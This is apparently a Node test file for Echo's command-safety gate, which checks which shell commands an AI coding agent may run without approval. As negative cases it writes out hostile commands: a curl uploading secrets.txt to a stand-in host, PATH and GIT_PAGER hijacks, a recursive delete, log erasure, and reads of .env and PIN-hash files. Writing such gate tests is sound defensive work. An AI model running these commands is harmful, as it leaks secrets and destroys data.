// Read-only checks that asked for approval anyway (task 144, Oct 1, 2026, and earlier tasks), built
// from the real commands: a grep and ls over Echo's data folder, a dry-run node script, curl to the
// worker's own smoke server, stopping that server, and reads after an echo_read grant. They now
// pass without asking. Real writes to Echo, deletes, secrets and network writes still ask.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { spawn, spawnSync } from 'node:child_process';
import { sandbox, fakeQuery, result, until } from './helpers.js';

const dirs = sandbox('readonlychecks');
const { classifyCommand, isReadOnlyCommand, expandLiterals, shellSegments } = await import('../lib/safety.js');
const { ownKill, splitKills } = await import('../lib/ownprocs.js');
const { sandboxNode, permissionFlag } = await import('../lib/nodesandbox.js');
const { TaskManager } = await import('../lib/tasks.js');
const { APP_DIR, config, DEFAULT_PORT } = await import('../lib/config.js');
const APP = `"${APP_DIR}"`;
const self = (cmd) => classifyCommand(cmd, { selfTask: true }).level;
const signal = new AbortController().signal;
const decision = (r) => r?.hookSpecificOutput?.permissionDecision || 'none';

// A pretend live Echo: code, a .env, data with the PIN hash, logs.
const live = path.join(dirs.root, 'Live Echo');
for (const [f, body] of Object.entries({
  '.env': 'KEY=x', 'lib/x.js': 'export const x = 1;\n', 'data/tasks.json': '[]', 'data/settings.json': '{}', 'data/memory.md': 'm',
  'data/stt-log.jsonl': '{}\n', 'data/self/pin.json': '{}', 'data/self/audit.log': '{}\n', 'data/conversations/2026-09-30.md': 'c', 'logs/echo.log': 'log\n',
})) {
  fs.mkdirSync(path.dirname(path.join(live, f)), { recursive: true });
  fs.writeFileSync(path.join(live, f), body);
}
const LIVE = `"${live}"`;

test("task 144's grep and ls over the data folder: globs are checked against what they really match", () => {
  const cmd = `cd ${LIVE}/data && grep -l "VoiceOps" *.json *.md *.jsonl 2>/dev/null; grep -o '"[a-zA-Z]*": *"[^"]*VoiceOps[^"]*"' tasks.json settings.json 2>/dev/null | cut -c1-160 | sort | uniq -c | sort -rn | head -30; ls self conversations | head`;
  assert.equal(isReadOnlyCommand(cmd), true);
  // The same against Echo's own folder is a plain read for a self task.
  assert.equal(self(`cd ${APP} && grep -l "Echo" *.json *.md 2>/dev/null; grep -o '"[a-z]*": *"[^"]*"' package.json | cut -c1-160 | sort | uniq -c | sort -rn | head -30; ls lib test | head`), 'safe');
  // A glob that reaches a secret, by name or by what's there, still isn't.
  for (const bad of [`cat ${LIVE}/data/self/*`, `cd ${LIVE}/data && cat self/*`, `cd ${LIVE} && cat .e*`, `cat ${LIVE}/data/*/p*`, `rg KEY ${LIVE}/data`, `rg KEY ${LIVE}/data/*`, `cd ${LIVE}/data && rg KEY`, `diff -r ${LIVE}/data /tmp/x`]) {
    assert.equal(isReadOnlyCommand(bad), false, bad);
  }
  assert.equal(isReadOnlyCommand(`cat ${LIVE}/data/*.json | wc -c; grep -c x ${LIVE}/data/*`), true, 'data/self is a folder: plain cat and grep skip it');
});

test('variables a command sets for itself are read as their values (L=…; tail $L/…)', () => {
  assert.equal(expandLiterals(`L="${live}/logs"; tail -5 "$L/echo.log"`), ` tail -5 "${live}/logs/echo.log"`);
  assert.equal(expandLiterals(`L=/a/b; awk '{print $L}' $L/x`), ` awk '{print $L}' /a/b/x`, 'single quotes keep $L as it is');
  for (const cmd of [
    `L="${APP_DIR}/logs"; ls "$L" | head; tail -n 20 "$L/echo.log"`,
    `D="${live}/data"; ls "$D" | head -30; jq -c 'keys' "$D/settings.json"; grep -c . "$D/stt-log.jsonl"`,
    `M="${APP_DIR}/package.json"; cat "\${M}"`,
  ]) assert.equal(isReadOnlyCommand(cmd), true, cmd);
  for (const cmd of [
    `D=$(mktemp -d); ls $D`, // not a literal
    `PATH=/tmp/evil; ls ${APP}`, // the environment's own variables are out
    `GIT_PAGER=sh; git -C ${APP} log`,
    `F="${live}/.env"; cat "$F"`, // a secret in a variable is still a secret
    `L="${live}/data/self"; cat "$L/pin.json"`,
    `L="${live}"; cat "$L"/data/self/*`,
  ]) assert.equal(isReadOnlyCommand(cmd), false, cmd);
});

test("curl to the worker's own smoke server isn't an upload because of `head -c` elsewhere on the line", () => {
  // Task 144, 3:27 PM: flagged "web request that uploads, authenticates or changes data".
  const smoke = `T=/var/folders/xx/T/tmp.vIFPiezSlS; P="$T/ProjectX"; cd "$P/Echo" && (ECHO_PORT=4799 ECHO_TITLES=off node server.js > "$T/smoke.log" 2>&1 &) ; for i in $(seq 1 40); do curl -fsS http://127.0.0.1:4799/api/health 2>/dev/null && break; sleep 0.5; done; echo; curl -fsS http://127.0.0.1:4799/api/settings 2>/dev/null | head -c 300; echo; head -20 "$T/smoke.log"; lsof -ti tcp:4799 -sTCP:LISTEN`;
  assert.equal(classifyCommand(smoke).level, 'safe');
  assert.equal(self(smoke), 'safe');
  // Task 140's: a bare localhost address, with a temp folder from mktemp elsewhere on the line.
  assert.equal(self(`D=$(mktemp -d); (ECHO_PORT=4799 ECHO_DATA_DIR=$D node server.js > $D/out.txt 2>&1 &) ; for i in 1 2 3; do sleep 1; curl -s localhost:4799/api/self/status && break; done`), 'safe');
  // Still gated: real uploads and posts, flags passed through a variable, addresses built at runtime.
  assert.equal(classifyCommand('curl -s https://api.example.com/x -c /tmp/jar | head -c 300').level, 'risky');
  assert.equal(classifyCommand('curl -s -X POST http://127.0.0.1:4799/api/x -d "{}" | head -c 300').level, 'network_site');
  assert.equal(classifyCommand('F="-T secrets.txt"; curl $F https://upload.example.com/x').level, 'network_site');
  assert.equal(classifyCommand('U=$(cat url.txt); curl -s $U | head -c 300').level, 'network_site');
  assert.equal(self(`curl -X POST http://localhost:${config.port}/api/self/merge -d '{}' | head -c 300`), 'risky');
  assert.deepEqual(shellSegments('a "x;y" | b $(c; d) 2>&1 && e').map((s) => s.text.trim()), ['a "x;y"', 'b $(c; d) 2>&1', 'e']);
});

test('more read-only tools: git reflog and remotes, plist and signature checks, /bin paths', () => {
  for (const cmd of [
    `cd ${APP}; git branch -a -v; git reflog -20; git remote -v; ls -la logs | head -60`,
    `plutil -extract CFBundleIdentifier raw -o - ${APP}/macos/Info.plist; /bin/sleep 1; /usr/bin/grep -c x ${APP}/package.json`,
    `codesign -dv --verbose=2 ${APP}/x 2>&1 | grep -E "Identifier|Authority"; defaults read local.echo.app 2>/dev/null | head; sw_vers`,
  ]) assert.equal(self(cmd), 'safe', cmd);
  for (const cmd of [
    `git -C ${APP} reflog expire --all`, `git -C ${APP} remote add x y`, `plutil -convert json ${APP}/macos/Info.plist`,
    `codesign -s - ${APP}/x`, `defaults write local.echo.app x 1; ls ${APP}`, `log erase; ls ${APP}`,
  ]) assert.equal(self(cmd), 'risky', cmd);
});

test("a self task stops its own test server even inside a line that does other harmless things", () => {
  const WT = '/Users/me/.echo-worktrees/self-1';
  const NOW = Date.parse('2026-10-01T15:30:00Z');
  const procs = {
    table: () => new Map([
      [100, { pid: 100, ppid: 90, age: 3600, command: 'node server.js' }],
      [43198, { pid: 43198, ppid: 1, age: 60, command: 'node server.js' }],
      [500, { pid: 500, ppid: 1, age: 60, command: 'python3 -m http.server' }],
    ]),
    listeners: (port) => (port === DEFAULT_PORT ? [100] : port === 4799 ? [43198] : []),
    users: (port) => (port === 4799 ? [43198] : []),
    match: () => [],
    cwd: (pid) => (pid === 43198 ? '/private/tmp/tmp.vIFPiezSlS/ProjectX/Echo' : '/'),
  };
  const restOk = (rest) => self(rest) === 'safe';
  const own = (cmd, ok = restOk) => ownKill(cmd, { worktree: WT, since: NOW - 20 * 60 * 1000, now: NOW, procs, livePids: [100], restOk: ok });
  // Task 144, 3:28 PM, word for word (but the temp folder).
  const t144 = `T=/private/tmp/tmp.vIFPiezSlS; P="$T/ProjectX"; mkdir -p "$P/SomeApp"; cd "$P/Echo" && node -e "import('./lib/projects.js').then(m=>console.log(JSON.stringify(m.listProjects().map(p=>p.name))))"; kill 43198; sleep 1; lsof -ti tcp:4799 -sTCP:LISTEN || echo stopped`;
  assert.deepEqual(splitKills(t144)?.targets, [{ pids: [43198] }]);
  assert.equal(own(t144).ok, true, own(t144).why);
  // Task 140, 3:42 AM: start the smoke server, check it, stop whatever is on the test port.
  assert.equal(own('D=$(mktemp -d); (ECHO_PORT=4799 ECHO_DATA_DIR=$D node server.js > $D/out.txt 2>&1 &) ; for i in 1 2 3; do sleep 1; curl -s localhost:4799/api/self/status && break; done; echo; lsof -ti:4799 | xargs kill').ok, true);
  assert.equal(own('for p in 43198; do kill 43198; done').ok, true, 'inside a loop');
  // Not when the kill hits something else, or the rest of the line would ask on its own.
  assert.equal(own('node x.js; kill 100').ok, false, 'the live Echo');
  assert.equal(own('node x.js; kill 500').ok, false, 'not the task\'s');
  assert.equal(own(`kill 43198; rm -rf /tmp/x`).ok, false, 'a recursive delete');
  assert.equal(own(`kill 43198; curl -X POST https://example.com/x -d y`).ok, false, 'a post');
  assert.equal(own(`kill 43198; cp x ${APP}/server.js`).ok, false, 'a write to Echo');
  assert.equal(own('kill 43198; kill $PID').ok, false, 'a kill it cannot read');
  assert.equal(own('node x.js; kill 43198', () => false).ok, false, 'without a caller vouching for the rest, only plain kills');
  assert.equal(own('kill 43198; sleep 1; ps -p 43198', () => false).ok, true, 'plain kills with read-only helpers, as before');
});

test('a dry-run node script that names the live Echo runs read-only in a sandbox', { skip: !permissionFlag() && 'this Node has no permission model' }, () => {
  const own = path.join(dirs.root, 'wt');
  fs.mkdirSync(own, { recursive: true });
  const where = { own, live, dataDir: path.join(live, 'data'), logDir: path.join(live, 'logs') };
  // Task 144, 3:31 PM (the rename dry run), in shape.
  const dry = `node -e "const fs=require('fs');console.log(fs.readFileSync('${live}/data/tasks.json','utf8'))" 2>&1 | sed 's#/Users/[^/]*#~#g'`;
  const boxed = sandboxNode(dry, where);
  assert.ok(boxed, 'sandboxed');
  assert.match(boxed, /^node --permission /);
  assert.doesNotMatch(boxed, new RegExp(`--allow-fs-write='${live.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`), 'nothing in the live folder is writable');
  assert.equal(spawnSync('/bin/sh', ['-c', boxed], { cwd: own, encoding: 'utf8' }).stdout.trim(), '[]', 'it reads the live data');
  // What the sandbox stops, run for real.
  const tryIt = (code) => spawnSync('/bin/sh', ['-c', sandboxNode(`node -e "${code}"`, where) || 'echo NOT_SANDBOXED'], { cwd: own, encoding: 'utf8' });
  const denied = (code) => /ERR_ACCESS_DENIED/.test(tryIt(code).stderr);
  assert.ok(denied(`require('fs').writeFileSync('${live}/lib/x.js','changed')`), 'no writes to Echo');
  assert.equal(fs.readFileSync(path.join(live, 'lib/x.js'), 'utf8'), 'export const x = 1;\n');
  assert.ok(denied(`require('fs').readFileSync('${live}/.env')`), 'no .env');
  assert.ok(denied(`require('fs').readFileSync('${live}/data/self/pin.json')`), 'no PIN hash');
  assert.ok(denied(`require('child_process').execSync('touch ${live}/x')`), 'no child processes');
  assert.equal(tryIt(`require('fs').readFileSync('${live}/data/self/audit.log');require('fs').writeFileSync('${own}/out.txt','ok')`).status, 0, 'the audit log reads, its own folder writes');
  // Only plain node runs with read-only helpers qualify.
  for (const cmd of [
    `node -e "x" > ${LIVE}/out.txt`,
    `node --allow-fs-write=/ -e "x"`,
    `node -e "x"; rm ${LIVE}/data/tasks.json`,
    `node -e "x" | tee ${LIVE}/y`,
    `node -e "$(cat ${LIVE}/lib/x.js)"`,
    `node < ${LIVE}/lib/x.js`,
    `npx something ${LIVE}`,
    `ECHO_DATA_DIR=${LIVE}/data node -e "x"`,
  ]) assert.equal(sandboxNode(cmd, where), null, cmd);
  assert.equal(sandboxNode('node -e "x"', { ...where, own: path.join(live, 'lib') }), null, 'never when its own folder is inside Echo');
});

/** Run one task whose worker calls `fn(hooks)` and returns what it saw; every request is denied. */
async function probe(kind, fn, { grant = false } = {}) {
  let out;
  const fq = fakeQuery(async (turn, text, options) => {
    const hook = (m) => options.hooks.PreToolUse.find((h) => h.matcher.split('|').includes(m)).hooks[0];
    out = await fn({ bash: hook('Bash'), canUseTool: options.canUseTool });
    return [result('ok')];
  });
  const tm = new TaskManager({ queryFn: fq.queryFn });
  const approvals = [];
  tm.on('approval', (t) => {
    approvals.push(t.pendingApproval.reason);
    tm.resolveApproval(t.id, false);
  });
  const cwd = path.join(dirs.worktrees, `${kind}-${Math.random().toString(36).slice(2, 8)}`);
  fs.mkdirSync(cwd, { recursive: true });
  const t = tm.create(kind === 'self' ? { kind: 'self', project: 'Echo (self)', cwd, instruction: 'x', self: { state: 'working' } } : { project: 'Demo', cwd, instruction: 'x' });
  if (grant) tm.grants.grant({ taskId: t.id, kind: 'echo_read' });
  await until(() => t.status === 'done', 5000, 'done');
  return { out, approvals };
}
const bashIn = (bash, command) => bash({ tool_name: 'Bash', tool_input: { command } }, 'id', { signal });

test('through the real gate: a self task reads, dry-runs and stops its own server without asking', async () => {
  let child;
  const { out, approvals } = await probe('self', async ({ bash, canUseTool }) => {
    // Its own smoke server, started after the task did, from a temp folder.
    child = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 60000)'], { cwd: dirs.root, stdio: 'ignore' });
    await new Promise((r) => setTimeout(r, 300));
    const node = await bashIn(bash, `node -e "import('./lib/rename.js').then(m=>console.log(typeof m))" 2>&1 | sed 's#/Users/[^/]*#~#g'; ls ${APP} | head -3`);
    return {
      grep: decision(await bashIn(bash, `cd ${APP} && grep -l "Echo" *.json *.md 2>/dev/null; ls lib test | head`)),
      vars: decision(await bashIn(bash, `L=${APP_DIR}; ls $L/lib | head -5; tail -5 $L/package.json`)),
      smoke: decision(await bashIn(bash, `for i in 1 2; do curl -fsS http://127.0.0.1:4799/api/health 2>/dev/null && break; sleep 0.5; done; curl -fsS http://127.0.0.1:4799/api/settings | head -c 300`)),
      dryRun: permissionFlag() ? decision(node) : 'allow',
      boxed: permissionFlag() ? /--permission/.test(node?.hookSpecificOutput?.updatedInput?.command || '') : true,
      kill: decision(await bashIn(bash, `T=${dirs.root}; mkdir -p "$T/SomeApp"; cd "$T" && node -e "console.log(1)"; kill ${child.pid}; sleep 1; lsof -ti tcp:4799 -sTCP:LISTEN || echo stopped`)),
      bashOutside: (await canUseTool('Bash', { command: `tail -5 ${config.logDir}/echo.log` }, { signal, blockedPath: config.logDir })).behavior,
      // These still ask (and are denied here).
      killLive: decision(await bashIn(bash, `kill ${process.pid}; echo x`)),
      killAndPost: decision(await bashIn(bash, `curl -s -X POST https://example.com/api/x -d y; kill ${child.pid}`)),
      write: decision(await bashIn(bash, `node -e "require('fs').writeFileSync('x','y')" > ${APP}/out.txt`)),
      livePort: decision(await bashIn(bash, `node -e "fetch('http://localhost:${config.port}/api/self/merge',{method:'POST'})"; ls ${APP}`)),
      bashWrite: (await canUseTool('Bash', { command: `touch ${config.logDir}/x` }, { signal, blockedPath: config.logDir })).behavior,
    };
  });
  child?.kill();
  assert.deepEqual(out, {
    grep: 'none', vars: 'none', smoke: 'none', dryRun: 'allow', boxed: true, kill: 'none', bashOutside: 'allow',
    killLive: 'deny', killAndPost: 'deny', write: 'deny', livePort: 'deny', bashWrite: 'deny',
  });
  assert.equal(approvals.length, 5, approvals.join('\n'));
});

test("an echo_read grant covers an ordinary task's read-only shell commands, including Claude Code's outside-folder check", async () => {
  const run = (grant) => probe('code', async ({ bash, canUseTool }) => ({
    grep: decision(await bashIn(bash, `cd ${APP} && grep -rn "readBack" lib | head -5; git log --oneline -3`)),
    bashOutside: (await canUseTool('Bash', { command: `cd ${APP} && ls lib | head` }, { signal, blockedPath: APP_DIR })).behavior,
    livePort: decision(await bashIn(bash, `curl -s http://localhost:${config.port}/api/health`)),
  }), { grant });
  const granted = await run(true);
  assert.deepEqual(granted.out, { grep: 'none', bashOutside: 'allow', livePort: 'deny' }, 'the live port stays gated, grant or not');
  assert.equal(granted.approvals.length, 1);
  const without = await run(false);
  assert.deepEqual(without.out, { grep: 'deny', bashOutside: 'deny', livePort: 'deny' });
});
